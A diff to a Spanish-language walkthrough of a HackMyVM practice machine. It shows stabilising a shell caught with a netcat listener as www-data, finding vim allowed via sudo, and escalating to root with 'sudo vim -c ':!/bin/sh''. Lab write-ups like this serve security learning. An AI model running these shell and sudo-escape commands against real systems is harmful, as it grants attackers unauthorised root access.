@@ -31,16 +31,30 @@ Luego volvemos a la pagina web y seguido de http://"ip"/ .............. <<<<<< c
 
 ![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204534.png)
 
+Listo ahora somos el usuarios www-data.
 
+![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204542.png)
 
+Realizamos el tratamiendo de la tty para tener una shell estable.
+>script /dev/null -c bash
+>crtl Z
+>stty raw -echo;fg
+>+ continued  nc -nlvp 443
+>                             reset
+>reset: unknown terminal type unknow
+>Terminal type? xterm
+>export TERM=xterm
+>export SHELL=bash
 
+Buscamos la forma de escalar privilegios para eso utilizamos el comando "sudo -l" y vemos que hay un binario llamado "vim".
 
+![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204702.png)
 
-## Imagen Inspiradora
-Aquí tienes una imagen que resume la esencia de mi proyecto:
+Nos dirijimos a gtfobins para ver si aca podemos encontrar la forma de explotar el binario "vim". Genial! al parecer si agregamos el siguiente comando podemos acceder a root:
+>sudo vim -c ':!/bin/sh'
 
-![Imagen]()
+![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204859.png)
 
-¡Espero que disfrutes explorando mi proyecto tanto como yo disfruté creándolo!
+Y listo somos usuario root!
 
-
+![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204913.png)
